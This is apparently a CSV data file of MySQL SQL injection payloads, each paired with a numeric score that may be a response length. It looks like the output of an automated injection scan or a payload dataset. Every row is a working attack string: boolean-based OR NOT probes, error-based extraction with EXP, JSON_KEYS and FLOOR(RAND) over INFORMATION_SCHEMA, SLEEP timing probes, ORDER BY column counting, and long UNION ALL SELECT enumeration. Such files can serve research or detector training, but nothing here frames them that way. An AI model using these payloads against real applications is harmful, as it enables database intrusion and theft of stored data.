payload,score
"[""1' OR NOT 8431=8431#""]",78
"[""1' OR NOT 8177=2261#""]",387
"[""1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b706271,(SELECT (ELT(1416=1416,1))),0x71627a7171,0x78))s), 8446744073709551610, 8446744073709551610)))-- rQCp""]",4228
"[""1' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b706271,(SELECT (ELT(3565=3565,1))),0x71627a7171,0x78))s), 8446744073709551610, 8446744073709551610)))-- WmtM""]",4228
"[""1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b706271,(SELECT (ELT(2253=2253,1))),0x71627a7171,0x78))x))-- ngEX""]",4270
"[""1' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b706271,(SELECT (ELT(6369=6369,1))),0x71627a7171,0x78))x))-- PZKd""]",4270
"[""1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b706271,(SELECT (ELT(3088=3088,1))),0x71627a7171)) USING utf8)))-- qtnq""]",4285
"[""1' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b706271,(SELECT (ELT(2306=2306,1))),0x71627a7171)) USING utf8)))-- iGSJ""]",4285
"[""1' AND (SELECT 7560 FROM(SELECT COUNT(*),CONCAT(0x716b706271,(SELECT (ELT(7560=7560,1))),0x71627a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CvTe""]",4273
"['(SELECT CONCAT(0x716b706271,(SELECT (ELT(7021=7021,1))),0x71627a7171))']",0
"[""1' AND SLEEP(5)-- fohf""]",0
"[""1' AND SLEEP(0)-- fohf""]",0
"[""1' AND SLEEP(5)-- fohf""]",0
"[""1' ORDER BY 1#""]",72
"[""1' ORDER BY 1948#""]",4284
"[""1' ORDER BY 10#""]",4286
"[""1' ORDER BY 6#""]",4287
"[""1' ORDER BY 4#""]",4287
"[""1' ORDER BY 3#""]",4287
"[""1' ORDER BY 2#""]",72
"[""1' UNION ALL SELECT NULL,CONCAT(0x716b706271,0x53774d78564753536e776d4178754c58746c616c766b4d664a55667a64644e6a6678696b54575a58,0x71627a7171)#""]",440
"[""1' UNION ALL SELECT NULL,CONCAT(0x716b706271,0x53774d78564753536e776d4178754c58746c616c766b4d664a55667a64644e6a6678696b54575a58,0x71627a7171) UNION ALL SELECT NULL,CONCAT(0x716b706271,0x7848794e56715a416a535959684f524e4e6e576a51697a6a6a45584b67486f4e7064547375556141,0x71627a7171)#""]",1097
"[""1' UNION ALL SELECT NULL,CONCAT(0x716b706271,0x53774d78564753536e776d4178754c58746c616c766b4d664a55667a64644e6a6678696b54575a58,0x71627a7171) FROM (SELECT 0 AS EDCt UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS cfuX#""]",7752
"[""1' UNION ALL SELECT NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL#""]",166
"[""1' UNION ALL SELECT NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""-1362' UNION ALL SELECT 9281#""]",4262
"[""-5866' UNION ALL SELECT 4702,4702#""]",90
"[""-2744' UNION ALL SELECT 5946,5946,5946#""]",4262
"[""-6338' UNION ALL SELECT 9535,9535,9535,9535#""]",4262
"[""-5174' UNION ALL SELECT 4857,4857,4857,4857,4857#""]",4262
"[""-1063' UNION ALL SELECT 5523,5523,5523,5523,5523,5523#""]",4262
"[""-2176' UNION ALL SELECT 9272,9272,9272,9272,9272,9272,9272#""]",4262
"[""-9120' UNION ALL SELECT 7473,7473,7473,7473,7473,7473,7473,7473#""]",4262
"[""-9426' UNION ALL SELECT 3825,3825,3825,3825,3825,3825,3825,3825,3825#""]",4262
"[""-6001' UNION ALL SELECT 3403,3403,3403,3403,3403,3403,3403,3403,3403,3403#""]",4262
"[""-6119' UNION ALL SELECT 2754,2754,2754,2754,2754,2754,2754,2754,2754,2754,2754#""]",4262
"[""-3557' UNION ALL SELECT 5843,5843,5843,5843,5843,5843,5843,5843,5843,5843,5843,5843#""]",4262
"[""-8540' UNION ALL SELECT 6177,6177,6177,6177,6177,6177,6177,6177,6177,6177,6177,6177,6177#""]",4262
"[""-3130' UNION ALL SELECT 3575,3575,3575,3575,3575,3575,3575,3575,3575,3575,3575,3575,3575,3575#""]",4262
"[""-4558' UNION ALL SELECT 4607,4607,4607,4607,4607,4607,4607,4607,4607,4607,4607,4607,4607,4607,4607#""]",4262
"[""-5784' UNION ALL SELECT 8470,8470,8470,8470,8470,8470,8470,8470,8470,8470,8470,8470,8470,8470,8470,8470#""]",4262
"[""-5136' UNION ALL SELECT 1106,1106,1106,1106,1106,1106,1106,1106,1106,1106,1106,1106,1106,1106,1106,1106,1106#""]",4262
"[""-8674' UNION ALL SELECT 3684,3684,3684,3684,3684,3684,3684,3684,3684,3684,3684,3684,3684,3684,3684,3684,3684,3684#""]",4262
"[""-3703' UNION ALL SELECT 7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819,7819#""]",4262
"[""-3708' UNION ALL SELECT 9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104,9104#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""-9125' UNION ALL SELECT 4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927,4927#""]",4262
"[""-5233' UNION ALL SELECT 8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707,8707#""]",4262
"[""-2320' UNION ALL SELECT 4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345,4345#""]",4262
"[""-1400' UNION ALL SELECT 5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417,5417#""]",4262
"[""-8337' UNION ALL SELECT 2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285,2285#""]",4262
"[""-6625' UNION ALL SELECT 6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425,6425#""]",4262
"[""-1796' UNION ALL SELECT 5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567,5567#""]",4262
"[""-6071' UNION ALL SELECT 7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051,7051#""]",4262
"[""-7612' UNION ALL SELECT 4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413,4413#""]",4262
"[""-9467' UNION ALL SELECT 7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879,7879#""]",4262
"[""-8647' UNION ALL SELECT 1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900,1900#""]",4262
"[""-7423' UNION ALL SELECT 8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704,8704#""]",4262
"[""-4169' UNION ALL SELECT 7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800#""]",4262
"[""-2242' UNION ALL SELECT 9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326,9326#""]",4262
"[""-5073' UNION ALL SELECT 2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687,2687#""]",4262
"[""-4579' UNION ALL SELECT 5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058,5058#""]",4262
"[""-4731' UNION ALL SELECT 3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583,3583#""]",4262
"[""-5328' UNION ALL SELECT 1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922,1922#""]",4262
"[""-6695' UNION ALL SELECT 5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361,5361#""]",4262
"[""-6335' UNION ALL SELECT 5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379,5379#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
